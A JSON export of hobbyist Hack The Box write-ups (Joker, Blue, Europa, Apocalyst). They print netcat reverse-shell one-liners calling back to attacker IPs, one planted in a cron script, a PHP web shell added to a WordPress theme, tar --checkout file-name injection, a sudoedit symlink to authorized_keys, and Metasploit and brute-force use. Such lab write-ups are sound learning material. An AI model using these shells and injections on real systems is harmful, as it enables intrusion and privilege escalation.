alt=\"\" src=\"http://www.xsisec.com/screenshots/Selection20190509-182501.png\" style=\"height:134px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>I spent some time of elaborating with hashcat and their parameters also few other tools like findmyhash, etc.</p>\n\n<p>since it was :</p>\n\n<p><em>Apache $apr1$ MD5, md5apr1, MD5 (APR)</em></p>\n\n<p><a href=\"https://www.notsosecure.com/maximum-password-length-reached/\" target=\"_blank\">https://www.notsosecure.com/maximum-password-length-reached/</a></p>\n\n<p>the hashmode became</p>\n\n<p><em>hashcat -m 1600</em></p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitamd-VMwareWorkstation20190509-182751.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitamd-VMwareWorkstation20190509-182751.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>since hashcat is uses the GPU I found it diffcult to configure the vmware worstation to use the host GPU.</p>\n\n<p>I was little bit inspired of @ippsec he had a own &#39;kraken&#39; machine he remotely used to crack stuff.</p>\n\n<p>so I set up a ubuntu 16.04 server with openssh</p>\n\n<p>though it was a really disaster to setup the gpu for the machine I couldn&#39;t compile the different intel modules correclty so I though I need to continue my work.</p>\n\n<p>so I run hashcat from my debian:</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Terminal-tmux%3A~20190508-115532.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Terminal-tmux%3A~20190508-115532.png\" style=\"height:258px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>it took 7 seconds to run the whole <em>&#39;rockyou.text&#39; </em>file.</p>\n\n<p>the password was &#39;<em>ihateseafood&#39;.</em></p>\n\n<p>then came the some things I spent a lots of time on..</p>\n\n<p>Since I couldn&#39;t run active scan on the http-proxy I needed somehow to configure the proxy burp-suite to listen to the proxy with authentication details:</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitamd-VMwareWorkstation20190508-122818.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitamd-VMwareWorkstation20190508-122818.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>afterwards I found following command though i had before less information of which kind of authentication it was:</p>\n\n<p><em>dirb http://127.0.0.1 -p 10.10.10.21:3128 -P kalamari:ihateseafood</em></p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitamd-VMwareWorkstation20190509-183613.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitamd-VMwareWorkstation20190509-183613.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>I was facing a lots of issues in burp suite to set up an upstream proxy to listen on port 80*</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Selection20190509-183854.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Selection20190509-183854.png\" style=\"height:241px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>though i needed to continue my work but this is something I will put some time to&nbsp; solve later on..</p>\n\n<p>dirb found two paths:</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Selection20190509-184031.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Selection20190509-184031.png\" style=\"height:185px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>the first &#39;list&#39; was just a shorten function to make http links shorten.</p>\n\n<p>the other was a web-gui-console:</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitamd-VMwareWorkstation20190509-184150.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitamd-VMwareWorkstation20190509-184150.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>I tested a lots of command like:</p>\n\n<p><em>sudo -i</em></p>\n\n<p><em>dpkg -i sudo</em></p>\n\n<p><em>/bin/bash</em></p>\n\n<p><em>/bin/sh</em></p>\n\n<p>and more...</p>\n\n<p>&nbsp;</p>\n\n<p>no results</p>\n\n<p>then I navigated to pentest-monkey and tried&nbsp; several different php and python shells.<br />\nlater on I was looking on @ippsec he used:</p>\n\n<p><em>os.popen(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1| nc -u 10.10.16.40 8083 &gt;/tmp/f&quot;).read()</em></p>\n\n<p>I set up a udp listener</p>\n\n<p>nc -u -lvnp 8083</p>\n\n<p>then I had an incoming shell</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Selection20190509-184441.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Selection20190509-184441.png\" style=\"height:176px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>I tried again</p>\n\n<p><em>sudo -i</em></p>\n\n<p><em>dpkg -i sudo</em></p>\n\n<p><em>/bin/bash</em></p>\n\n<p><em>/bin/sh</em></p>\n\n<p>then I found</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Selection20190509-184551.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Selection20190509-184551.png\" style=\"height:124px; width:500px\" /></a></p>\n\n<p>then I did some research but basically was stuck I couldnt read any directories on the server.</p>\n\n<p>I was watching more @ippsec</p>\n\n<p>the solution was really cool honestly I never done something like that before.</p>\n\n<p>from my hostmachine I generated ssh key</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitamd-VMwareWorkstation20190509-184937.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitamd-VMwareWorkstation20190509-184937.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>then I saved</p>\n\n<p>the whole string into the file &#39;layout.html&#39; on the victim machine.</p>\n\n<p>Since it was a private key I pasted on the victim hachine I could remote it an voila I am in:</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Selection20190509-185134.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Selection20190509-185134.png\" style=\"height:161px; width:261px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>then I was watching @ippsec the rest of the priveleges escalation I was a little bit tired of this machine very complicated..</p>\n\n<p>The outcame was the target was vulnerable against &#39;sudoedit - unauthorized privilege escalation&#39;</p>\n\n<p>&nbsp;</p>\n\n<p><em>&#39;I was able to perform such redirect and retrieve the data from the /etc/shadow file. In order for you to replicate this, you should configure the following line in your /etc/sudoers file: &lt;user_to_grant_priv&gt; ALL=(root) NOPASSWD: sudoedit /home/*/*/test.txt Then, logged as that user, create a subdirectory within its home folder (e.g. /home/&lt;user_to_grant_priv&gt;/newdir) and later create a symbolic link inside the new folder named test.txt pointing to /etc/shadow. When you run sudoedit /home/&lt;user_to_grant_priv&gt;/newdir/test.txt you will be allowed to access the /etc/shadow even if have not been granted with such access in the sudoers file.&#39;</em></p>\n\n<p>&nbsp;</p>\n\n<p>anyway the outcame was basically there is a scheduled job that makes backup of some files in a package as &#39;tar.gz&#39; on the server each 5th min. I modified the job by attach some calls to a shell I made.</p>\n\n<p>&nbsp;</p>\n\n<p>To exploit this vulnerability, create a directory inside:</p>\n\n<p><em>/var/www/testing</em></p>\n\n<p><em>/var/www/testing:$</em></p>\n\n<p><em>mkdir dir /var/www/testing:$ </em></p>\n\n<p><em>cd dir /var/www/testing/dir:$ </em></p>\n\n<p><em>ln -s /home/alekos/authorised_keys ./layout.html</em></p>\n\n<p>You just created a symbolic link for&nbsp;authorised_keys</p>\n\n<p>&nbsp;</p>\n\n<p><em>/var/www/testing/dir:$</em></p>\n\n<p><em>ls /var/www/testing/dir:$ layout.html -&gt; /home/alekos/authorized_keys</em></p>\n\n<p>&nbsp;</p>\n\n<p><em>sudoedit -u alekos /var/www/testing/dir/layout.html</em></p>\n\n<p>I added my ssh-key inside the file.</p>\n\n<p><em>&nbsp;ssh -i id_rsa alekos@10.10.10.21</em></p>\n\n<p>&nbsp;</p>\n\n<p>after I was able to remove according to the exploit...</p>\n\n<p>I created two files:</p>\n\n<p><em>--checkout=1&nbsp;</em></p>\n\n<p><em>--checkout=exec=sh shell.sh</em></p>\n\n<p>Created a payload name shell.sh.</p>\n\n<p><em>#!/bin/bash cat /root/root.txt &gt; /home/alekos/pass.txt </em></p>\n\n<p><em>chmod +r /home/alekos/pass.txt</em></p>\n\n<p>&nbsp;</p>\n\n<p>Wait for it to execute. (around 3-5 minutes)</p>\n\n<p>After sometime you will find a file named pass.txt in&nbsp;/home/alekos/</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Selection20190509-190203.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Selection20190509-190203.png\" style=\"height:306px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>BAM thanks</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
      "ipadress": "10.10.10.21",
      "title": "Joker - Completed [Hack the box]  ",
      "published": {
        "seconds": 1557419583,
        "nanoseconds": 152000000
      },
      
      "author": "XsiSec"
    },
    "e0dscOIV6DeA3IKHymGL": {
      "author": "XsiSec",
      
      "image": null,
      "content": "During this project I had in my mind, I need to deploy this before I can start to make  Google Capture the flags challenges it's  a really big relief to me I got finally a website that works pretty well.",
      "title": "Finally done with this project.",
      "published": {
        "seconds": 1552141042,
        "nanoseconds": 934000000
      }
    },
    "epB4bIjLgOeHaENtbYzx": {
      "title": "Blue - Completed [Hack the box]",
      "published": {
        "seconds": 1558627515,
        "nanoseconds": 433000000
      },
      "author": "XsiSec",
      
      "levels": [
        "Beginner"
      ],
      "image": null,
      "os": [
        "Windows"
      ],
      "content": "<p>Since I made several boxes so far is this the definitely the simpliest one.</p>\n\n<p>I started with a nmap scan as usual:</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-174624.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-174624.png\" style=\"height:274px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>then I made additonal one</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-174722.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-174722.png\" style=\"height:274px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>To save a lots of time I proceeded directly to google and made a search I found &quot;Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - &#39;EternalBlue&#39; SMB Remote Code Execution (MS17-010)&quot;</p>\n\n<p>https://www.exploit-db.com/exploits/42315</p>\n\n<p>though I faced some ruby error it missed error handling if the exploit can&#39;t detect the OS, I also found a patched one I learned to import to metasploit, though exactly the same result.<br />\nto continue my work as fast as possible I did a searchsploit scan on smb</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-175126.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-175126.png\" style=\"height:274px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>I first scanned the host if the target was vulnerable against M17-010 with &quot;<em>scanner/smb/smb_ms17_010&quot;</em></p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-175537.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-175537.png\" style=\"height:274px; width:500px\" /></a></p>\n\n<p><em>[+] 10.10.10.40:445&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)<br />\n[*] 10.10.10.40:445&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - Scanned 1 of 1 hosts (100% complete)<br />\n[*] Auxiliary module execution completed</em></p>\n\n<p>&nbsp;</p>\n\n<p>then I run the shell in background and run &quot;<em>multi/recon/local_exploit_suggester</em>&quot;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-175754.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-175754.png\" style=\"height:274px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>I had several choices I started up with <em>&quot;use exploit/windows/local/ms14_058_track_popup_menu&quot;</em></p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-175933.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-175933.png\" style=\"height:274px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p><em>[*] Started reverse TCP handler on 10.10.14.9:4444<br />\n[*] Launching notepad to host the exploit...<br />\n[+] Process 3976 launched.<br />\n[*] Reflectively injecting the exploit DLL into 3976...<br />\n[*] Injecting exploit into 3976...<br />\n[*] Exploit injected. Injecting payload into 3976...<br />\n[*] Payload injected. Executing exploit...<br />\n[*] Sending stage (179779 bytes) to 10.10.10.14<br />\n[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.<br />\n[*] Meterpreter session 2 opened (10.10.14.9:4444 -&gt; 10.10.10.14:1052) at 2019-05-23 11:37:10 -0400</em></p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-180138.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-180138.png\" style=\"height:274px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>I could of course done it looks smother by run instead from &quot;meterpreter&gt;shell&quot; though lazy..</p>\n\n<p>I didnt needed to do any privilges escalation lucky this time...</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-180253.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190523-180253.png\" style=\"height:274px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>I learned on this box how to import exploits and also work fast also since the victim provided so much information I could do some shortcuts.</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n",
      "ipadress": "10.10.10.40"
    },
    "fZhnGhLyHLxRUb7e2S7Q": {
      
      "author": "XsiSec",
      "levels": [
        "Beginner"
      ],
      "image": null,
      "os": [
        "Linux"
      ],
      "content": "<p>today I spent about one hour to walk through basics within the editor &#39;VIM&#39;&nbsp; again, I felt I needed&nbsp; more knowledge about vim when I hacked a box and a shell where no tools is installed on the remote computer.</p>\n\n<p><strong>j - down<br />\nk - up<br />\nh - left<br />\nl - right<br />\ngg - top of file<br />\nG - bottom of tile<br />\nnumber gg - goes to specific line number&nbsp;</strong></p>\n\n<p><strong>search/find/replace<br />\n/searchTerm - searches for current text<br />\nn - goes to the next location of the searched text<br />\n?searchTerm - searches backwards for current text<br />\n* - searches for the current text the cursor is on</strong></p>\n\n<p><strong>:%s/findText/replaceText - searches all text and replaces text no confirmation.</strong></p>\n\n<p><strong>:%s/findText/repalceText/c - searches text and confirms each replace.</strong></p>\n\n<p><strong>editing mutiple windows:<br />\n:split filename - splits the window horizontal<br />\n:vsplit filename - splits the window virtual<br />\nctrl-w j - moves to the window down<br />\nctrl-w k - moves to the window up<br />\nctrl-w h - moves to the window to the left<br />\nctrl-w l - moves to the window to the right</strong></p>\n\n<p><strong>v - enter visual mode (select text with hjkl)<br />\ny - yanks text<br />\n:put - paste text after current line<br />\np - paste at current position</strong></p>\n",
      "ipadress": "0",
      "title": "another lesson of VIM",
      "published": {
        "seconds": 1555584359,
        "nanoseconds": 963000000
      }
    },
    "kYmAuGcy9NmvaajWFXFT": {
      
      "author": "XsiSec none",
      "levels": [
        "Medium"
      ],
      "image": null,
      "os": [
        "Linux"
      ],
      "content": "<p>Finally completed the second part I hade some seriusly issues in the last step to get the root flag.</p>\n\n<p><br />\nLet me explain....</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>this is just a continue of the Part1, I found a tool in the system that I could modify the requests from within BurpSuite.</p>\n\n<p>the first thing I did was to set-up a simpleHTTPServer with python also downloaded a simple php shell from pentestmonkey.</p>\n\n<p>&#39;python -m SimpleHTTPServer 8081&#39;</p>\n\n<p>after I set-up a local proxy server I also setup a listener for the incoming connection for the shell</p>\n\n<p>&#39;nc -lvnp 1337&#39;</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4-VMwareWorkstation20191213-105111.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4-VMwareWorkstation20191213-105111.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>then afterwards there was location the server where the was running a cronjob &#39;/var/www/cmd/logcleared.sh&#39;,</p>\n\n<p>I tried several times to edit the file with &#39;vi&#39; but I didnt get it then I found out after a hell of atempts with variously things.</p>\n\n<p>&nbsp;</p>\n\n<p>I delete the existing file and then reupload a file with &#39;wget&#39;.</p>\n\n<p>that contained following info:</p>\n\n<p>&nbsp;</p>\n\n<p>#!/bin/sh<br />\nrm /tmp/fa; mkfifo /tmp/fa; cat /tmp/fa|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.24 51002 &gt; /tmp/fa</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>then I only needed to wait for the server to run the cronjob</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4-VMwareWorkstation20191213-171217.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/KaliLinux64bitAMDGnome2019Release4-VMwareWorkstation20191213-171217.png\" style=\"height:275px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>voila I have root access.</p>\n\n<p>&nbsp;</p>\n\n<p>finally done=)</p>\n\n<p>&nbsp;</p>\n",
      "ipadress": "10.10.10.22",
      "title": "Europa Part 2  [Hack the box] - [Blog] ",
      "published": {
        "seconds": 1576254242,
        "nanoseconds": 8000000
      }
    },
    "khnIusVMjixO9TlzDPfr": {
      
      "author": "XsiSec",
      "levels": [
        "Hard"
      ],
      "image": null,
      "os": [
        "Linux"
      ],
      "content": "<p>I started up with nmap scan as usual also put <em>10.10.10.46</em> &gt; into /etc/hosts <em>apocalyst.htb</em></p>\n\n<p>and also dirb in the background.</p>\n\n<p><em>nmap -A -sC -sV -oA initial 10.10.10.46</em></p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-150431.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-150431.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>then I made another port scan</p>\n\n<p><em>nmap -p -&nbsp; -oA ports 10.10.10.46</em></p>\n\n<p>though nothing interesting.</p>\n\n<p>when I visited the box it was just an image:</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-150923.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-150923.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>also nothing in the pagesource I was stuck for a while I made few scans with dirb:</p>\n\n<p>I found it was wordpress</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-151118.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-151118.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>according to the result there was a lots of different nested urls though when I visited each of the urls for instance <em>http://apocalyst.htb/eagles/</em> and <em>http://apocalyst.htb/link/ </em></p>\n\n<p>&nbsp;</p>\n\n<p>the site presented all the time the Apocalypse Image nothing of interest.</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-151703.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-151703.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>when I tried to navigate to pages that didnt exist I got error 404.</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-110146.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-110146.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>when I visted different paths for instance (eg. <em>http://apocalyst.htb/eagle/</em> , <em>http://apocalyst.htb/link/ </em>) the site shown only the image very frustating I also downloaded the image and run steghide against it but nothing useful found..</p>\n\n<p>@ippsec he was using instead of dirb or dirbuster a tool called gobuster I used it few times before, he face the HTTP code 301(Moved Permanently)</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-152551.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-152551.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>then @ippsec was listening to the request and played around with the slash &quot;/&quot; in the end of the url and he shown that if you remove the slash in the end of the url:</p>\n\n<p><em>http://apocalyst.htb/eagle</em></p>\n\n<p>the&nbsp; site send 301 Error (Moved Permanently)</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-152244.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-152244.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>though if you append the slash the request is OK seems OK. so he added few parameters to the gobuster scan:</p>\n\n<p>I have also never used the tool called <strong>cewl,</strong> basically the tools fetches all the keywords found on a&nbsp; page. he mentioned that depending of with --depth you add it might take way to long time so no parameters for that.</p>\n\n<p><em>cewl http://apocalyst.htb</em></p>\n\n<p>then he used the wordlist for the gobuster search:</p>\n\n<p><em>gobuster -u http://apocalyst.htb -w&nbsp; /home/xsisec/Desktop/HTB/Apocalyst/cewl.txt -f -l | tee gobuster.txt</em></p>\n\n<p>&nbsp;</p>\n\n<p>now the flags</p>\n\n<p>-f append a forward-slash to each directory request (dir mode only)</p>\n\n<p>-l include the length of the body in the output (dir mode only)</p>\n\n<p>| tee gobuster.txt (saves the output)</p>\n\n<p>then I learned the way of filter grep results to except all lines contains &#39;Size: 157&#39;:</p>\n\n<p><em>cat gobuster.txt | grep -v &#39;Size: 157&#39;</em></p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-153126.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-153126.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>Result:</p>\n\n<p><em>/Rightiousness/ (Status: 200) [Size: 175]</em></p>\n\n<p>then when i visited the url it looks like the image above though visited the page source:</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-153306.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-153306.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>I downloaded the file run <em>steghide extract -sf image.txt&nbsp; </em>I didnt put any keyphrase.&nbsp; I got a wordlist.</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-112925.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-112925.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>I also run wpscan though I faced a lots of difficulties anyway...</p>\n\n<p>I found the username:</p>\n\n<p><strong>falaraki</strong></p>\n\n<p>after a while I figured out the way of put flags correctly but ended up with I will defenitely do more research of programs I am uses the version its very important to make the additonaly parameters will work.</p>\n\n<p>&nbsp;wpscan --url apocalyst.htb -P /home/xsisec/Desktop/HTB/Apocalyst/list.txt&nbsp; -U falaraki</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-115221.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-115221.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>Voila password found.</p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;I learned also how to use hydra more effecient</p>\n\n<p>&nbsp;</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-121937.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-121937.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>&nbsp;</p>\n\n<p>anyway.....</p>\n\n<p>I logged on to wordpress and added to the theme404.php file</p>\n\n<p><em>&lt;?php system($_REQUEST[&#39;xsisec&#39;]);?&gt;</em></p>\n\n<p>I could run ls to list all the directories</p>\n\n<p>though i coudnt get a shell working to listen.</p>\n\n<p>I stepped futher I used following exploit:</p>\n\n<p>use exploit/unix/webapp/wp_admin_shell_upload</p>\n\n<p><em>set rhost 10.10.10.46</em></p>\n\n<p><em>set username falaraki</em></p>\n\n<p><em>set password Transclisiation</em></p>\n\n<p><em>exploit</em></p>\n\n<p>&nbsp;</p>\n\n<p>worked fine I could now get the user flag</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-124514.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-124514.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>though I couldnt get the root flag.</p>\n\n<p>&nbsp;</p>\n\n<p>since I have some experience before I navigated to /tmp/</p>\n\n<p>uploaded LinEnum.py to get&nbsp; systeminfo:</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-132719.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-132719.png\" style=\"height:281px; width:500px\" /></a></p>\n\n<p>&nbsp;</p>\n\n<p>WOHA bad stuff <em>/etc/passwd</em> is possible to change wtf..</p>\n\n<p>i know what I wanted to do though I was watching @ippsec how to add the a user into the passwd file</p>\n\n<p>I run openssl to generate the hash:</p>\n\n<p><a href=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-133217.png\" target=\"_blank\"><img alt=\"\" src=\"http://www.xsisec.com/screenshots/Kali-Linux-2019.2-vmware-amd64-VMwareWorkstation20190527-133217.png\" style=\"height:281px; 